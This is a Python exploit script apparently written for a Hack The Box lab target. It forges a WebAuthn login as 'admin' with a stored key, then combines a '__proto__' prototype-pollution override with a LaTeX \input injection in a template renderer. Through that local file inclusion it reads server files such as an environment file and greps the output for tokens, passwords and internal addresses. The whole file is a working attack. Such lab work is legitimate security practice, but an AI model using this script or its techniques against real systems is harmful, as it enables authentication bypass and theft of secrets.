#!/usr/bin/env python3
"""Reliable LFI using \\input; extract from pdflatex stderr."""
import json
import pickle
import hashlib
import struct
import time
import re
import sys
import requests
from fido2.utils import websafe_decode, websafe_encode
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import hashes, serialization

BASE = "http://10.129.115.125:3000"
HEADERS = {"Host": "aegis.korvia.htb"}
CRED = r"C:\Users\tdgf\OneDrive\Bureau\CODE\Repo\HTB\aegis_cred.pkl"
OUT = r"C:\Users\tdgf\OneDrive\Bureau\CODE\Repo\HTB"


def session():
    data = pickle.load(open(CRED, "rb"))
    priv = serialization.load_pem_private_key(data["priv_pem"], password=None)
    s = requests.Session()
    s.headers.update(HEADERS)
    r = s.post(f"{BASE}/api/v1/auth/webauthn/auth/begin", json={})
    ch = websafe_decode(r.json()["challenge"])
    auth = hashlib.sha256(b"aegis.korvia.htb").digest() + bytes([1]) + struct.pack(
        ">I", int(time.time()) % 65535
    )
    cd = json.dumps(
        {
            "type": "webauthn.get",
            "challenge": websafe_encode(ch),
            "origin": "http://aegis.korvia.htb:3000",
            "crossOrigin": False,
        },
        separators=(",", ":"),
    ).encode()
    sig = priv.sign(auth + hashlib.sha256(cd).digest(), ec.ECDSA(hashes.SHA256()))
    body = {
        "id": websafe_encode(data["cred_id"]),
        "rawId": websafe_encode(data["cred_id"]),
        "type": "public-key",
        "response": {
            "clientDataJSON": websafe_encode(cd),
            "authenticatorData": websafe_encode(auth),
            "signature": websafe_encode(sig),
            "userHandle": websafe_encode(b"admin"),
        },
        "clientExtensionResults": {},
    }
    s.post(f"{BASE}/api/v1/auth/webauthn/auth/finish", json=body).raise_for_status()
    return s


def read_file(s, path):
    body = "x\n\n`" + r"\input{" + path + "}`{=latex}\n"
    # save first - seemed to help latex path
    s.post(
        f"{BASE}/admin/templates/firmware-critical-v4/save",
        json={"body": body},
        timeout=30,
    )
    r = s.post(
        f"{BASE}/admin/templates/firmware-critical-v4/render",
        json={
            "body": body,
            "overrides": json.dumps({"__proto__": {"allowRawBlocks": True}}),
        },
        timeout=180,
    )
    j = r.json()
    err = ""
    for st in j.get("stages", []):
        if st.get("stage") in ("pdflatex", "latex"):
            err += st.get("stderr") or ""
    safe = path.replace("/", "_")
    open(f"{OUT}/lfierr{safe}.txt", "w", encoding="utf-8").write(err)
    print(f"[+] {path} stderr_len={len(err)} pandoc={[st.get('cmd','')[20:50] for st in j.get('stages',[]) if st.get('stage')=='pandoc']}")
    # print interesting lines
    for line in err.splitlines():
        if any(
            x in line
            for x in [
                "TOKEN",
                "password",
                "PASSWORD",
                "opc",
                "AEGIS_",
                "172.16",
                "user",
                "MSSQL",
                "bcdf",
                path.split("/")[-1],
            ]
        ):
            print(line[:200])
    return err


if __name__ == "__main__":
    s = session()
    for p in sys.argv[1:] or ["/etc/aegis-render.env"]:
        read_file(s, p)
